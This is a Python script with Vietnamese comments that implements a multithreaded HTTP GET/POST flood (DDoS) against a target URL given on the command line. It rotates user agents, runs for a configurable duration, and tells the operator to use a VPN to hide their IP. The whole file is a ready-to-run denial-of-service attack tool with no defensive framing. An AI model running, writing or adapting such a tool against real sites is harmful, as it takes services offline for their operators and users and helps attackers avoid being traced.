import socket
import random
import threading
import time
import sys
import ssl
import urllib.parse
import os

# ========== CẤU HÌNH NHẸ ==========
TARGET_URL = "http://target.com"
THREADS = 80              # Giảm luồng để đỡ lag
DURATION = 120            # Giây
METHOD = "GET"            # Chỉ dùng GET hoặc POST (nhẹ hơn UDP, Slowloris)
USE_VPN = True            # Bật VPN ở cấp hệ thống, tắt proxy trong script
# ==================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

def parse_target():
    parsed = urllib.parse.urlparse(TARGET_URL)
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    scheme = parsed.scheme
    port = 443 if scheme == "https" else 80
    return host, path, scheme, port

def http_flood(thread_id):
    host, path, scheme, port = parse_target()
    is_https = scheme == "https"
    end = time.time() + DURATION
    sent = 0
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if is_https:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ua = random.choice(USER_AGENTS)
            if METHOD == "GET":
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            else:
                body = "x=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
                req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
            sock.send(req.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            sent += 1
            # Nghỉ ngắn để giảm CPU
            time.sleep(0.001)
        except:
            pass
    print(f"Thread {thread_id} gửi {sent} request.")

def main():
    global TARGET_URL, THREADS, DURATION, METHOD
    if len(sys.argv) < 2:
        print("Usage: python ddos_light.py <URL> [threads] [duration] [GET|POST]")
        print("Example: python ddos_light.py https://target.com 80 120 GET")
        sys.exit(1)
    TARGET_URL = sys.argv[1]
    if len(sys.argv) > 2:
        THREADS = int(sys.argv[2])
    if len(sys.argv) > 3:
        DURATION = int(sys.argv[3])
    if len(sys.argv) > 4:
        METHOD = sys.argv[4].upper()

    print(f"[+] Mục tiêu: {TARGET_URL}")
    print(f"[+] Số luồng: {THREADS}, Thời gian: {DURATION}s, Phương thức: {METHOD}")
    print(f"[+] VPN đã bật? {'CÓ' if USE_VPN else 'KHÔNG'} – đảm bảo bạn đang dùng VPN để ẩn IP")
    print("[+] Bắt đầu tấn công (nhẹ CPU)... (Ctrl+C để dừng)")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=http_flood, args=(i,))
        t.start()
        threads.append(t)
        # Giãn cách tạo thread để giảm tải CPU
        if i % 10 == 0:
            time.sleep(0.05)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Dừng bởi người dùng.")
        sys.exit(0)
    print("[+] Kết thúc tấn công.")

if __name__ == "__main__":
    main()
